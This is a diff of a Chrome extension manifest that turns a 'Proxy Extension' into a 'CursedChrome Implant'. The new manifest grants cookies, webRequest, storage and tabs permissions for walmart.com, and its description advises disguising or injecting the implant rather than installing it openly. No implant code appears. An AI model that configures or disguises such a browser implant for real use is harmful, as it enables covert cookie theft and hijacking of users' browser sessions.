@@ -1,28 +1,23 @@
 {
+  "name": "CursedChrome Implant",
+  "version": "0.0.1",
   "manifest_version": 3,
-  "name": "Proxy Extension",
-  "version": "1.0",
+  "description": "Example Chrome extension with implant code. You should probably inject/disguise the implant instead of installing this extension directly.",
+  "homepage_url": "https://thehackerblog.com",
   "icons": {
-    "16": "images/icon-16.png",
-    "32": "images/icon-32.png",
-    "48": "images/icon-48.png",
-    "128": "images/icon-128.png"
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
   },
-  "action": {
-    "default_popup": "popup.html"
+  "default_locale": "en",
+  "background": {
+    "service_worker": "src/bg/background.js"
   },
-  "background":{
-    "service_worker": "service_worker.js"
-  },
-  "host_permissions": ["https://www.walmart.com/*"],
-  "permissions": ["tabs","scripting"],
-  "content_scripts": [
-    {
-      "all_frames": true,
-      "js": ["jquery.js","content.js"],
-      "matches": [
-        "https://www.walmart.com/*"
-      ]
-    }
-  ]
+  "permissions": [
+    "webRequest",
+    "cookies",
+    "storage",
+    "tabs"
+  ],
+  "host_permissions" :[ "*://*.walmart.com/"]
 }
